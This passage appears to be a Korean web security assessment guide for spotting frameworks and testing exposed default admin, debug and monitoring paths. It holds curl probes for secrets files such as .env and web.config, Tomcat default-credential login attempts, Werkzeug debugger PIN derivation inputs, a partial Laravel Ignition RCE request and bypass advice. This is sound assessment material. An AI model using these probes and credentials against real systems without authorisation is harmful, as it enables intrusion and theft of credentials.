---
sidebar_position: 33
title: 프레임워크 기본 경로 점검
description: 웹 진단 - 프레임워크·웹서버 식별 후 기본 관리/디버그/모니터링 경로의 노출과 접근 제어를 점검하는 절차
keywords: [Framework, Actuator, Spring Boot, Tomcat, Django, Flask, FastAPI, Laravel, ASP.NET, Ruby on Rails, Express, Next.js, Nuxt, WordPress, Apache, Nginx, GraphQL, Default Path, Debug, Admin, OWASP A02]
draft: false
toc_max_heading_level: 4
---

## 점검 목적

웹 애플리케이션의 프레임워크·웹서버를 식별한 뒤, 해당 기술에 기본 포함된 관리·디버그·모니터링·API 문서 경로가 운영 환경에서 인증 없이 접근 가능한지 확인한다. 대부분의 프레임워크는 개발 편의를 위한 강력한 내장 기능을 제공하는데, 이것이 운영에 그대로 남으면 내부 구조 노출부터 원격 코드 실행까지 이어질 수 있다.

- 경로 존재만으로 취약으로 판정하지 않는다. 반환 내용의 민감도와 인증 여부를 함께 본다.
- 일반적인 정보 노출 판단 기준은 [정보 노출](./information-disclosure.md)에서 다룬다.
- 오류 응답의 상세 정보 노출은 [예외 처리 미흡](./error-handling.md)에서 다룬다.
- 보안 헤더와 제품 배너 노출은 [보안 헤더 점검](./security-headers.md)에서 다룬다.

---

## 프레임워크 식별

프레임워크를 먼저 식별해야 어떤 기본 경로를 점검할지 결정할 수 있다. 식별은 주로 응답에서 관찰되는 수동적 단서로 시작한다.

#### 응답에서 기술 스택 판별

다음 순서로 관찰한다. 하나의 단서만으로 확정하지 않고, 여러 지표를 교차 확인한다.

```text
1. 에러 페이지 형식 — 프레임워크 기본 에러 페이지는 가장 강한 식별 단서
2. 응답 헤더 — Server, X-Powered-By, Set-Cookie 이름과 형식
3. 쿠키 이름 — JSESSIONID, csrftoken, laravel_session 등
4. URL 패턴 — 확장자(.do, .aspx, .php), 경로 구조
5. HTML 소스 — meta generator, __VIEWSTATE, csrf token hidden field
6. JavaScript — __NEXT_DATA__, __NUXT__, 번들 경로 패턴
```

#### 식별 지표 요약

| 프레임워크 | 에러 페이지 | 헤더·쿠키 | URL·HTML 단서 |
| :--- | :--- | :--- | :--- |
| **Spring Boot** | Whitelabel Error Page, `{"timestamp":...,"status":...,"error":...}` | `JSESSIONID`, `X-Application-Context` | `.do`, `.action` 확장자 |
| **Tomcat** | `Apache Tomcat/X.X.X` 기본 404/500 | `Server: Apache-Coyote` | `/examples/`, `/docs/` |
| **Django** | `You are seeing this page because DEBUG = True`, 노란 배경 traceback | `csrftoken`, `sessionid` | `/admin/`, `csrfmiddlewaretoken` hidden field |
| **Flask** | Werkzeug Debugger 화면 | `Server: Werkzeug/X.X.X` | — |
| **FastAPI** | `{"detail":"Not Found"}` JSON | — | `/docs`, `/redoc`, `/openapi.json` |
| **Laravel** | Ignition 에러 페이지, Whoops 화면 | `laravel_session`, `XSRF-TOKEN` | `.php` 확장자, Blade 에러 |
| **ASP.NET** | YSOD (Yellow Screen of Death) | `ASP.NET_SessionId`, `X-AspNet-Version`, `X-Powered-By: ASP.NET` | `.aspx`, `__VIEWSTATE`, `__EVENTVALIDATION` |
| **Rails** | `Action Controller: Exception Caught` 화면 | `_session_id`, `X-Request-Id`, `X-Runtime` | `Turbo-Frame` 헤더 |
| **Express** | `ReferenceError: ... at ...` 스택 트레이스 | `X-Powered-By: Express`, `connect.sid` | — |
| **Next.js** | `__nextjs_original-stack-frame` 오버레이 | `__Secure-next-auth` | `/_next/`, `__NEXT_DATA__` script |
| **Nuxt** | Nuxt 에러 페이지 (개발 모드) | — | `/_nuxt/`, `__NUXT__` script |
| **WordPress** | 기본 테마 에러 | `X-Powered-By: PHP/X.X` | `/wp-content/`, `/wp-includes/`, `<meta name="generator" content="WordPress X.X">` |
| **Apache** | `Apache/X.X.X (OS) Server at ... Port ...` | `Server: Apache/X.X.X` | — |
| **Nginx** | `nginx/X.X.X` 기본 에러 | `Server: nginx/X.X.X` | — |

식별이 되면 아래 해당 프레임워크 섹션의 기본 경로를 점검한다. 프레임워크를 식별하지 못한 경우에도 공통 경로(`/health`, `/metrics`, `/swagger-ui/`, `/graphql`)는 확인할 수 있다.

---

## 프레임워크별 기본 경로

### 1. Spring Boot

Spring Boot Actuator는 운영 모니터링용 내장 모듈이다. 개발 중에 전체 endpoint를 열어두고 운영에서 제한하지 않는 실수가 매우 흔하다.

**식별 확인:**

```bash
# Whitelabel Error Page 확인
curl -sS https://<TARGET>/nonexistent-test-path

# Spring Boot 기본 에러 JSON 포맷
# {"timestamp":"...","status":404,"error":"Not Found","path":"..."}
```

#### Actuator 엔드포인트와 위험도

| 경로 | 위험도 | 노출 정보 |
| :--- | :--- | :--- |
| `/actuator/env` | 🔴 Critical | DB 비밀번호, API 키, 환경변수 전체. `spring.datasource.password` 등이 원문 노출 가능 |
| `/actuator/heapdump` | 🔴 Critical | JVM 힙 메모리 전체 덤프. 세션 토큰, 비밀번호, 암호화 키 추출 가능 |
| `/actuator/configprops` | 🔴 High | 설정 속성 전체. DB URL, 외부 서비스 연결 정보 |
| `/actuator/mappings` | 🔴 High | 전체 URL 맵과 컨트롤러 클래스명. 숨겨진 관리 endpoint 발견 |
| `/actuator/jolokia` | 🔴 High | JMX MBean 접근. 설정에 따라 원격 코드 실행 가능 |
| `/actuator/gateway/routes` | 🔴 High | Spring Cloud Gateway 전체 라우팅 규칙. 내부 서비스 주소 노출 |
| `/actuator/metrics` | 🟡 Medium | 서버 상태 수치. URI 태그에서 전체 endpoint 목록 추출 가능 |
| `/actuator/loggers` | 🟡 Medium | 로그 레벨 목록. POST로 런타임 로그 레벨 변경 가능 |
| `/actuator/httptrace` | 🟡 Medium | 최근 HTTP 요청·응답. 다른 사용자의 세션 헤더 포함 가능 |
| `/actuator/beans` | 🟡 Medium | 등록된 모든 Spring Bean과 의존성 |
| `/actuator/threaddump` | 🟡 Medium | 스레드 덤프. 실행 중인 쿼리·요청 정보 |
| `/actuator/scheduledtasks` | 🟢 Low | 예약 작업 목록 |
| `/actuator/health` | 🟢 Low | 기본은 상태만. `show-details=always`면 DB·디스크·외부 서비스 상세 |
| `/actuator/info` | 🟢 Low | 빌드 정보. 보통 비어있거나 git commit 해시 정도 |
| `/actuator/shutdown` | 🔴 Critical | POST 요청으로 애플리케이션 종료. 기본 비활성이지만 확인 필요 |

#### 버전별 차이와 base path 변형

Spring Boot 1.x와 2.x 이상에서 Actuator 경로가 다르다.

| 항목 | 1.x | 2.x+ |
| :--- | :--- | :--- |
| 기본 경로 | `/health`, `/env`, `/mappings` (루트) | `/actuator/health`, `/actuator/env` |
| 기본 노출 | 대부분 기본 활성 | `health`, `info`만 기본 노출 |
| 보안 | Spring Security 의존 | 별도 `management.endpoints.web.exposure` 설정 |

base path는 설정으로 바뀔 수 있다. `management.endpoints.web.base-path` 값에 따라 `/actuator` 대신 `/manage`, `/admin`, `/monitor` 등이 사용된다. management port가 분리된 경우 외부에서 접근 불가할 수 있다.

```text
/actuator/...          ← 기본
/manage/...            ← 커스텀 base path
/monitor/...
/admin/actuator/...    ← context-path 뒤에 붙는 경우
```

#### 점검 흐름

```bash
# 1. Actuator 루트 확인 — endpoint 목록이 반환되면 전체 구조 파악
curl -sS https://<TARGET>/actuator
curl -sS https://<TARGET>/actuator/

# 2. 위험도 높은 endpoint부터 순서대로
curl -sS https://<TARGET>/actuator/env
curl -sS https://<TARGET>/actuator/configprops
curl -sS https://<TARGET>/actuator/mappings

# 3. heapdump는 접근 가능 여부만 확인 (HEAD로 크기 확인)
curl -sI https://<TARGET>/actuator/heapdump

# 4. metrics에서 URI 태그 추출 — 숨겨진 endpoint 발견
curl -sS https://<TARGET>/actuator/metrics/http.server.requests
# 응답의 "tag" → "values" 에서 전체 URI 목록 확인

# 5. 1.x 경로도 시도
curl -sS https://<TARGET>/env
curl -sS https://<TARGET>/mappings
```

#### Spring Cloud 추가 경로

Spring Cloud를 사용하는 경우 추가 endpoint가 존재한다.

| 경로 | 위험도 | 설명 |
| :--- | :--- | :--- |
| `/actuator/gateway/routes` | 🔴 High | Gateway 라우팅 규칙 전체 |
| `/actuator/gateway/globalfilters` | 🟡 Medium | 글로벌 필터 목록 |
| `/env` + `/refresh` | 🔴 Critical | 1.x에서 환경변수 수정 후 refresh로 반영 → RCE 가능 |
| `/actuator/bus-refresh` | 🔴 High | Spring Cloud Bus를 통한 전체 인스턴스 설정 갱신 |

**확인할 것**: `/actuator` 루트에서 `_links`로 활성 endpoint 목록이 반환되면 해당 목록만 확인한다. 루트가 차단되어도 개별 endpoint는 열려 있을 수 있다. `env`에서 값이 `******`로 마스킹되어도 `configprops`나 `heapdump`에서 원문이 나올 수 있으므로 마스킹만 보고 안전하다고 판단하지 않는다.

---

### 2. Apache Tomcat

Spring Boot 없이 Tomcat에 직접 배포된 애플리케이션에서 관리 인터페이스와 기본 콘텐츠가 남아 있는 경우를 점검한다.

**식별 확인:**

```bash
# 기본 에러 페이지에서 버전 확인
curl -sS https://<TARGET>/nonexistent-test-path
# "Apache Tomcat/9.0.XX" 등이 포함된 HTML

# Server 헤더
curl -sI https://<TARGET>/
# Server: Apache-Coyote/1.1
```

#### 점검 경로

| 경로 | 위험도 | 노출 정보 |
| :--- | :--- | :--- |
| `/manager/html` | 🔴 Critical | 웹 관리 콘솔. WAR 배포 가능 → RCE |
| `/manager/text` | 🔴 Critical | 텍스트 기반 관리 인터페이스. 스크립트 배포 가능 |
| `/manager/status` | 🟡 Medium | 서버 상태, JVM 정보, 커넥터 상태 |
| `/host-manager/html` | 🔴 High | 가상 호스트 관리. 호스트 추가·삭제 가능 |
| `/docs/` | 🟢 Low | Tomcat 기본 문서. 버전 정보 |
| `/examples/` | 🟡 Medium | 서블릿·JSP 예제. 세션 조작, 쿠키 설정 등의 기능 포함 |
| `/examples/jsp/snp/snoop.jsp` | 🟡 Medium | 서버 환경, 요청 헤더, 시스템 속성 출력 |
| `/WEB-INF/web.xml` | 🔴 High | 애플리케이션 설정. 서블릿 매핑, 보안 설정 |

#### 기본 자격증명

Manager 앱에 인증 창(`401`)이 뜨면 기본 자격증명을 확인한다.

| 사용자명 | 비밀번호 | 비고 |
| :--- | :--- | :--- |
| `tomcat` | `tomcat` | 가장 흔한 기본값 |
| `admin` | `admin` | — |
| `admin` | `` (빈 값) | — |
| `tomcat` | `s3cret` | 일부 버전 기본값 |
| `role1` | `tomcat` | tomcat-users.xml 예제 |

```bash
# Manager 접근 시도
curl -sS -u tomcat:tomcat https://<TARGET>/manager/html

# 상태 페이지
curl -sS -u tomcat:tomcat https://<TARGET>/manager/status

# text 인터페이스로 배포된 앱 목록
curl -sS -u tomcat:tomcat "https://<TARGET>/manager/text/list"
```

#### AJP 커넥터 (Ghostcat)

Tomcat은 기본적으로 8009 포트에서 AJP(Apache JServ Protocol) 커넥터를 실행한다. CVE-2020-1938 (Ghostcat)은 AJP를 통해 WEB-INF 내부 파일을 읽거나 JSP로 실행할 수 있다.

```bash
# AJP 포트 열림 여부
nmap -sS -p 8009 <TARGET>
```

**확인할 것**: Manager 접근이 `403`이면 IP 기반 접근 제한(`RemoteAddrValve`)이 설정된 것이다. 내부 네트워크에서 접근 가능한지 확인한다. `/examples/`는 운영 환경에 남아 있을 이유가 없으므로 존재 자체가 설정 미흡의 근거가 된다. 에러 페이지의 Tomcat 버전 문자열은 `server.xml`의 `Server` 헤더 설정으로 숨길 수 있다.

---

### 3. Django

Django의 `DEBUG=True` 설정이 운영에 남아 있으면 설정값, 환경변수, SQL 쿼리, 전체 URL 구조가 에러 페이지를 통해 노출된다.

**식별 확인:**

```bash
# Django 기본 환영 페이지 (새 프로젝트 기본)
curl -sS https://<TARGET>/
# "The install worked successfully! Congratulations!"

# 관리자 로그인
curl -sS https://<TARGET>/admin/login/
# Django 기본 관리자 로그인 폼 HTML 확인

# csrfmiddlewaretoken hidden field 존재
curl -sS https://<TARGET>/login/ | grep csrfmiddlewaretoken
```

#### 점검 경로

| 경로 | 위험도 | 노출 정보 |
| :--- | :--- | :--- |
| `/admin/` | 🔴 High | Django 관리자 패널. 기본 자격증명이나 약한 인증일 수 있음 |
| 존재하지 않는 경로 (DEBUG=True) | 🔴 Critical | 전체 URL 패턴 목록, 설정값, 환경변수 |
| `/__debug__/` | 🔴 Critical | Django Debug Toolbar. SQL 쿼리, 템플릿, 신호, 캐시 정보 |
| `/static/` | 🟢 Low | 정적 파일 디렉터리. 디렉터리 리스팅이 열리면 파일 구조 노출 |
| `/media/` | 🟡 Medium | 업로드 파일 디렉터리. 다른 사용자 파일 접근 가능 |
| `/api/` 또는 `/api/v1/` | 🟡 Medium | Django REST Framework 사용 시 Browsable API |

#### DEBUG=True 에러 페이지

Django에서 `DEBUG=True`인 상태에서 에러가 발생하면 다음이 모두 노출된다.

```text
Settings — 전체 settings.py 내용 (SECRET_KEY, DATABASE 설정 포함)
Environment — 환경변수 전체
Traceback — Python 스택 트레이스와 로컬 변수
URL patterns — 전체 URL conf
SQL queries — 실행된 쿼리와 바인딩 값
Request — 헤더, 쿠키, POST 데이터 전체
```

```bash
# DEBUG=True 확인 — 존재하지 않는 경로로 에러 유도
curl -sS https://<TARGET>/nonexistent-test-path-12345
# "You're seeing this error because you have DEBUG = True" 포함 여부

# 잘못된 Host 헤더로 ALLOWED_HOSTS 에러 유도
curl -sS -H "Host: invalid.test.host" https://<TARGET>/
# DisallowedHost 에러 시 전체 설정 노출
```

#### Django Debug Toolbar

별도 패키지(`django-debug-toolbar`)가 설치된 경우 `/__debug__/` 경로에서 세부 정보를 제공한다.

```bash
curl -sS https://<TARGET>/__debug__/
```

노출 패널:

| 패널 | 위험도 | 내용 |
| :--- | :--- | :--- |
| SQL | 🔴 High | 실행된 전체 쿼리와 실행 시간 |
| Templates | 🟡 Medium | 렌더링된 템플릿과 컨텍스트 변수 |
| Headers | 🟡 Medium | 요청·응답 헤더 전체 |
| Signals | 🟢 Low | Django 신호 목록 |
| Cache | 🟡 Medium | 캐시 호출과 적중률 |
| Profiling | 🟡 Medium | 함수별 실행 시간 |

#### Django REST Framework

DRF 사용 시 `DEFAULT_RENDERER_CLASSES`에 `BrowsableAPIRenderer`가 포함되면 브라우저에서 API를 탐색·실행할 수 있다.

```bash
# 브라우저 렌더러 활성 확인 — Accept 헤더로 HTML 요청
curl -sS -H "Accept: text/html" https://<TARGET>/api/
```

**확인할 것**: `/admin/`은 Django를 쓰면 거의 항상 존재한다. 로그인 폼이 보이는 것 자체는 정상이며, 기본·약한 자격증명으로 접근 가능한지가 핵심이다. `DEBUG=True` 에러 페이지에서 `SECRET_KEY`가 노출되면 세션 위조, CSRF 토큰 위조, 서명된 쿠키 복호화가 가능하므로 Critical로 판정한다.

---

### 4. Flask / FastAPI

#### Flask — Werkzeug 디버거

Flask가 `debug=True`로 실행되면 Werkzeug 대화형 디버거가 활성화된다. 에러 발생 시 브라우저에서 Python 코드를 직접 실행할 수 있다.

**식별 확인:**

```bash
curl -sI https://<TARGET>/
# Server: Werkzeug/X.X.X Python/X.X.X
```

| 경로·조건 | 위험도 | 노출 정보 |
| :--- | :--- | :--- |
| 에러 발생 시 디버거 화면 | 🔴 Critical | 대화형 Python 콘솔. 코드 실행 가능 |
| `/console` | 🔴 Critical | 직접 콘솔 접근 (활성화된 경우) |
| 에러 스택 트레이스 | 🟡 Medium | 소스 코드, 파일 경로, 로컬 변수 |

#### Werkzeug 디버거 PIN 우회

Werkzeug 디버거는 PIN으로 보호되지만, PIN은 서버의 결정적 값들로 계산된다.

```text
PIN 계산에 필요한 값:
1. username — 프로세스 실행 사용자 (파일 읽기로 확인)
2. modname — 보통 'flask.app' 또는 'werkzeug.debug'
3. appname — 보통 'Flask' 또는 'wsgi_app'
4. modpath — flask/app.py 의 절대 경로 (에러 traceback에서 확인)
5. MAC address — /sys/class/net/<iface>/address (LFI로 읽기)
6. machine-id — /etc/machine-id + /proc/sys/kernel/random/boot_id
```

에러 traceback이나 LFI를 통해 이 값들을 수집할 수 있으면 PIN을 계산하여 콘솔 접근이 가능하다.

```bash
# 에러 유도 — traceback에서 경로·사용자 정보 확인
curl -sS "https://<TARGET>/nonexistent"

# 콘솔 접근 시도
curl -sS "https://<TARGET>/console"
```

#### FastAPI — 자동 문서

FastAPI는 기본적으로 API 문서를 자동 생성한다.

| 경로 | 위험도 | 노출 정보 |
| :--- | :--- | :--- |
| `/docs` | 🟡 Medium | Swagger UI. 모든 endpoint, 파라미터, 스키마 표시. "Try it out"으로 실행 가능 |
| `/redoc` | 🟡 Medium | ReDoc 문서. 읽기 전용이지만 전체 API 구조 노출 |
| `/openapi.json` | 🟡 Medium | OpenAPI 스키마 원본. 전체 데이터 모델 정의 포함 |

```bash
# FastAPI 자동 문서 확인
curl -sS https://<TARGET>/docs
curl -sS https://<TARGET>/openapi.json
```

**확인할 것**: Werkzeug 디버거가 활성화된 상태에서 에러를 유도할 수 있으면 PIN 보호 여부와 관계없이 Critical이다. PIN 자체가 결정적 값으로 계산되므로 "PIN이 있으니 안전하다"고 판단하지 않는다. FastAPI의 `/docs`는 내부 API를 외부에 공개하는 것이므로, 인증 없이 접근 가능하고 민감한 endpoint가 포함되어 있으면 취약으로 판정한다.

---

### 5. Laravel

Laravel은 PHP 프레임워크 중 가장 널리 사용되며, 디버그 모드와 환경 설정 파일 노출이 빈번하다.

**식별 확인:**

```bash
# 쿠키 확인
curl -sI https://<TARGET>/
# Set-Cookie: laravel_session=...; XSRF-TOKEN=...

# Ignition 에러 페이지 (APP_DEBUG=true)
curl -sS https://<TARGET>/nonexistent-test-path
```

#### 점검 경로

| 경로 | 위험도 | 노출 정보 |
| :--- | :--- | :--- |
| `/.env` | 🔴 Critical | APP_KEY, DB 비밀번호, API 키, 메일 설정 등 환경변수 전체 |
| `/_ignition/health-check` | 🟡 Medium | Ignition 디버그 도구 활성 여부 확인 |
| `/_ignition/execute-solution` | 🔴 Critical | CVE-2021-3129. 특정 조건에서 RCE 가능 |
| `/telescope` | 🔴 High | Laravel Telescope. 요청, 쿼리, 로그, 예외, 메일 전체 모니터링 |
| `/horizon` | 🔴 High | Laravel Horizon. 큐 작업 대시보드, 작업 내용·실패 정보 |
| `/nova` | 🟡 Medium | Laravel Nova 관리 패널 |
| `/storage/logs/laravel.log` | 🔴 High | 애플리케이션 로그. 스택 트레이스, 사용자 데이터, SQL 쿼리 |
| `/vendor/` | 🟡 Medium | Composer 패키지 디렉터리. 버전 정보, 소스 코드 |
| `/storage/framework/sessions/` | 🔴 Critical | 세션 파일 직접 접근. 세션 하이재킹 가능 |
| `/.env.backup`, `/.env.old`, `/.env.save` | 🔴 Critical | 환경 파일 백업 |

#### APP_DEBUG=true 에러 페이지

디버그 모드가 켜져 있으면 에러 발생 시 다음이 노출된다.

```text
Environment — .env 파일의 환경변수 전체
Stack trace — PHP 스택 트레이스와 소스 코드 일부
Request — 헤더, 쿠키, POST 데이터, 세션 데이터
Database query — 실행된 SQL 쿼리
Application — APP_KEY, 설정값
```

#### CVE-2021-3129 (Ignition RCE)

Laravel Ignition 2.5.1 이하에서 `/_ignition/execute-solution` 을 통해 파일 쓰기와 코드 실행이 가능하다.

```bash
# Ignition 활성 확인
curl -sS https://<TARGET>/_ignition/health-check
# {"can_execute_commands":true} 등의 응답

# 취약 버전에서 RCE 확인 (PoC 구조)
curl -sS -X POST https://<TARGET>/_ignition/execute-solution \
  -H "Content-Type: application/json" \
  -d '{"solution":"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution","parameters":{"variableName":"test","viewFile":"..."}}'
```

```bash
# .env 파일 직접 접근
curl -sS https://<TARGET>/.env

# 로그 파일
curl -sS https://<TARGET>/storage/logs/laravel.log

# 디버그 도구
curl -sS https://<TARGET>/telescope
curl -sS https://<TARGET>/horizon
```

**확인할 것**: `.env` 파일이 200으로 반환되면 `APP_KEY`를 포함한 모든 환경변수가 노출된다. `APP_KEY`는 세션 암호화, 쿠키 서명에 사용되므로 노출 시 세션 위조가 가능하다. Telescope와 Horizon은 인증이 설정되어 있어도 미들웨어 우회가 가능한 경우가 있으므로, 접근이 차단되더라도 다른 경로로 우회를 시도한다.

---

### 6. ASP.NET

ASP.NET은 클래식 ASP.NET(Web Forms, MVC)과 ASP.NET Core로 나뉜다. 각각 다른 진단 경로와 에러 형식을 가진다.

**식별 확인:**

```bash
curl -sI https://<TARGET>/
# X-AspNet-Version: 4.0.30319
# X-Powered-By: ASP.NET
# Set-Cookie: ASP.NET_SessionId=...

# ViewState 확인 (Web Forms)
curl -sS https://<TARGET>/ | grep __VIEWSTATE
```

#### 점검 경로

| 경로 | 위험도 | 대상 | 노출 정보 |
| :--- | :--- | :--- | :--- |
| `/elmah.axd` | 🔴 High | Classic | ELMAH 에러 로그. 스택 트레이스, 쿼리 문자열, 서버 변수, 사용자 정보 |
| `/trace.axd` | 🔴 High | Classic | 요청 트레이스. 헤더, 쿠키, 폼 데이터, 서버 변수 |
| `/web.config` | 🔴 Critical | 둘 다 | 연결 문자열, machineKey, 인증 설정 |
| `/web.config.bak` | 🔴 Critical | 둘 다 | web.config 백업 |
| `/swagger/` | 🟡 Medium | 둘 다 | Swashbuckle API 문서 |
| `/hangfire` | 🔴 High | 둘 다 | Hangfire 백그라운드 작업 대시보드. 작업 실행·삭제 가능 |
| `/health`, `/healthz` | 🟢 Low | Core | 상태 확인 endpoint |
| `/_vti_bin/`, `/_vti_cnf/` | 🟡 Medium | Classic | FrontPage 서버 확장. 파일 목록·구조 정보 |
| `/aspnet_client/` | 🟢 Low | Classic | ASP.NET 클라이언트 스크립트. 버전 정보 |

#### YSOD (Yellow Screen of Death)

ASP.NET에서 처리되지 않은 예외가 발생하면 상세 에러 페이지(YSOD)가 표시된다. `customErrors mode="Off"` 또는 Core의 `UseDeveloperExceptionPage()`가 운영에 남아 있을 때 발생한다.

```text
노출 내용:
- 전체 스택 트레이스와 소스 코드 라인
- 쿼리 문자열과 폼 변수
- 쿠키와 서버 변수
- .NET 버전과 IIS 버전
- web.config 설정 일부
```

#### ELMAH 에러 로그

```bash
# ELMAH 접근 — 기본적으로 인증 없이 열림
curl -sS https://<TARGET>/elmah.axd
# RSS 피드, CSV 다운로드, 개별 에러 상세 페이지 제공

# 최근 에러 RSS
curl -sS https://<TARGET>/elmah.axd/rss
```

ELMAH는 기본 설정에서 **인증 없이** 모든 에러 로그를 공개한다. 각 에러 항목에는 요청 전체(쿼리, 폼 데이터, 헤더, 쿠키, 서버 변수)가 포함된다.

#### machineKey와 ViewState

`web.config`에서 `machineKey`가 노출되면 `__VIEWSTATE` 역직렬화 공격이 가능하다.

```xml
<!-- web.config에서 확인할 값 -->
<machineKey validationKey="..." decryptionKey="..." validation="SHA1" decryption="AES" />
```

```bash
# web.config 직접 접근
curl -sS https://<TARGET>/web.config
curl -sS https://<TARGET>/web.config.bak
curl -sS https://<TARGET>/web.config.old

# Hangfire 대시보드
curl -sS https://<TARGET>/hangfire
```

**확인할 것**: `elmah.axd`가 열리면 다른 사용자의 요청 데이터가 포함된 에러 로그를 모두 볼 수 있으므로 즉시 취약으로 판정한다. `web.config`의 `machineKey` 노출은 ViewState 역직렬화를 통한 RCE로 이어지므로 Critical이다. `trace.axd`는 IIS 기본 설정에서 로컬 접근만 허용하지만 리버스 프록시 뒤에서 우회되는 경우가 있다.

---

### 7. Ruby on Rails

Rails는 개발 모드에서 상세한 에러 정보와 라우트 맵을 제공한다. 추가 gem으로 설치되는 관리 도구도 점검 대상이다.

**식별 확인:**

```bash
curl -sI https://<TARGET>/
# X-Request-Id: 550e8400-e29b-41d4-a716-446655440000
# X-Runtime: 0.123456
# Set-Cookie: _<appname>_session=...

# Rails 기본 에러 (development)
curl -sS https://<TARGET>/nonexistent-test-path
# "Action Controller: Exception Caught" 또는 BetterErrors 화면
```

#### 점검 경로

| 경로 | 위험도 | 노출 정보 |
| :--- | :--- | :--- |
| `/rails/info/routes` | 🔴 High | 전체 라우트 목록. 컨트롤러, 액션, HTTP 메서드, 경로 패턴 |
| `/rails/info/properties` | 🟡 Medium | Rails 버전, Ruby 버전, 환경, 미들웨어 스택 |
| `/rails/mailers` | 🟡 Medium | 메일러 프리뷰. 이메일 템플릿과 내용 |
| `/rails/conductor/action_mailbox/inbound_emails` | 🟡 Medium | Action Mailbox 수신 이메일 |
| `/sidekiq` | 🔴 High | Sidekiq 대시보드. 큐·작업 목록, 재시도·삭제 가능, Redis 정보 |
| `/rails/db` | 🔴 Critical | rails_db gem. 브라우저에서 DB 직접 쿼리 실행 |
| `/letter_opener` | 🟡 Medium | Letter Opener gem. 발송된 이메일 내용 열람 |
| `/admin` | 🟡 Medium | ActiveAdmin, RailsAdmin 등 관리 패널 |
| `/pghero` | 🔴 High | PgHero gem. PostgreSQL 쿼리 통계, 인덱스, 연결 정보 |
| 에러 페이지 (development) | 🔴 High | 전체 스택 트레이스, 소스 코드, 인스턴스 변수, 요청 파라미터 |

#### 개발 모드 에러 정보

Rails가 `development` 환경으로 실행되면 에러 발생 시 다음이 노출된다.

```text
소스 코드 — 에러 발생 위치 전후의 Ruby 코드
파라미터 — 요청 파라미터, 세션, 쿠키 전체
환경 — 환경변수 (DATABASE_URL, SECRET_KEY_BASE 포함)
라우트 — 전체 라우트 테이블
```

BetterErrors gem이 설치된 경우 대화형 REPL 콘솔이 에러 페이지에 포함되어 서버에서 Ruby 코드를 실행할 수 있다.

```bash
# 개발 모드 라우트 정보
curl -sS https://<TARGET>/rails/info/routes
curl -sS https://<TARGET>/rails/info/properties

# Sidekiq 대시보드
curl -sS https://<TARGET>/sidekiq

# ActiveAdmin / RailsAdmin
curl -sS https://<TARGET>/admin
```

**확인할 것**: `/rails/info/routes`가 열리면 전체 API 구조가 노출되므로 숨겨진 관리 endpoint를 찾는 데 직접 사용된다. Sidekiq 대시보드는 `mount Sidekiq::Web` 라인에서 인증 미들웨어 없이 마운트되는 실수가 흔하다. BetterErrors의 REPL이 외부에서 접근 가능하면 RCE이므로 Critical이다.

---

### 8. Node.js / Express

Express 자체에는 관리 패널이 없지만, 디버그 모드와 흔히 함께 쓰이는 미들웨어·모듈의 기본 경로를 점검한다.

**식별 확인:**

```bash
curl -sI https://<TARGET>/
# X-Powered-By: Express
# Set-Cookie: connect.sid=...
```

#### 점검 경로

| 경로 | 위험도 | 노출 정보 |
| :--- | :--- | :--- |
| 에러 응답 (development) | 🟡 Medium | 스택 트레이스와 파일 경로. `NODE_ENV=development`일 때 |
| `/api-docs` 또는 `/swagger` | 🟡 Medium | swagger-ui-express. API 전체 구조와 실행 기능 |
| `/graphql` | 🟡 Medium | GraphQL endpoint (별도 섹션 참조) |
| `/health`, `/status`, `/metrics` | 🟢 Low | 커스텀 상태 endpoint. 의존성·연결 상태 포함 여부 확인 |
| `/.env` | 🔴 Critical | dotenv 환경 파일. DB URL, API 키, 시크릿 |
| `/server.js`, `/app.js` | 🔴 High | 소스 파일 직접 접근 (정적 파일 서빙 미설정 시) |
| `/node_modules/` | 🟡 Medium | 의존성 디렉터리. 패키지 버전, 취약 모듈 확인 |
| `/package.json` | 🟡 Medium | 의존성 목록과 스크립트. 내부 구조 파악 |
| `/bull-board`, `/arena`, `/queues` | 🟡 Medium | Bull/BullMQ 큐 대시보드 |

#### Express 에러 핸들러

`NODE_ENV`가 `development`이거나 설정되지 않으면 Express 기본 에러 핸들러가 스택 트레이스를 반환한다.

```bash
# 에러 유도 — 존재하지 않는 경로 또는 잘못된 입력
curl -sS https://<TARGET>/api/users/not-a-number

# 응답에 스택 트레이스 포함 여부 확인
# ReferenceError: xxx is not defined
#     at /app/routes/users.js:42:15
#     at Layer.handle ...
```

`production`에서도 에러 핸들러를 커스터마이징하지 않으면 기본 HTML 에러 페이지가 노출될 수 있다.

```bash
# 소스 파일 직접 접근
curl -sS https://<TARGET>/server.js
curl -sS https://<TARGET>/app.js
curl -sS https://<TARGET>/package.json
curl -sS https://<TARGET>/.env

# Swagger 문서
curl -sS https://<TARGET>/api-docs
curl -sS https://<TARGET>/swagger
```

**확인할 것**: `X-Powered-By: Express` 헤더는 `app.disable('x-powered-by')`로 쉽게 제거되므로 없다고 Express가 아닌 것은 아니다. `/.env` 파일 접근은 정적 파일 서빙의 루트 디렉터리 설정에 따라 달라진다. `express.static('public')` 대신 `express.static('.')`으로 설정하면 프로젝트 루트의 모든 파일이 노출된다.

---

### 9. Next.js / Nuxt

SSR(Server-Side Rendering) 프레임워크에서 빌드 산출물, 서버 데이터, 이미지 프록시의 노출을 점검한다.

**식별 확인:**

```bash
# Next.js
curl -sS https://<TARGET>/ | grep "__NEXT_DATA__"
# <script id="__NEXT_DATA__" type="application/json">...</script>

# Nuxt
curl -sS https://<TARGET>/ | grep "__NUXT__"
# window.__NUXT__={...}
```

#### Next.js

| 경로·기능 | 위험도 | 노출 정보 |
| :--- | :--- | :--- |
| `/_next/data/<BUILD_ID>/<page>.json` | 🟡 Medium | SSR 페이지의 서버 측 데이터. `getServerSideProps` 반환값 전체 |
| `/_next/static/` | 🟢 Low | 빌드 산출물. source map이 포함되면 원본 소스 노출 |
| `/_next/image?url=<EXTERNAL_URL>&w=256&q=75` | 🔴 High | 이미지 최적화 프록시. 외부 URL을 지정하면 SSRF 가능 |
| `/api/` | 🟡 Medium | API Routes. 인증 없는 endpoint 탐색 |
| `__NEXT_DATA__` script | 🟡 Medium | 페이지 HTML에 포함된 서버 데이터. 민감 props 노출 가능 |
| `x-middleware-subrequest` 헤더 | 🔴 Critical | CVE-2025-29927. 미들웨어 인증 우회 (14.18.9 이전, 15.2.3 이전) |
| source map (`.js.map`) | 🔴 High | 원본 소스 코드, 환경변수, 비밀값 노출 |
| `NEXT_PUBLIC_*` 환경변수 | 🟡 Medium | 클라이언트 번들에 포함된 환경변수. API 키 등 확인 |

```bash
# BUILD_ID 확인
